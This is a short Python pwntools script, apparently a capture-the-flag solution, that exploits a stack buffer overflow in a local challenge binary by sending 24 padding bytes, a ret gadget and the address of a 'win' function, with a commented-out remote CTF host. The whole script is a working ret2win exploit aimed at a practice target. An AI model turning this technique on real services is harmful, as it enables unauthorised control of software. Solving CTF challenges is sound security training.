from pwn import *

binary = context.binary = ELF("./chal")

p = process(binary.path)
#p = remote("testings.ggc.tf", 31737)

r = ROP([binary])

payload = b""
payload += b'A'*24
# Stack alignment maybe not needed for remote
payload += p64(r.ret.address)
payload += p64(binary.sym['win'])
p.sendline(payload)

p.interactive()

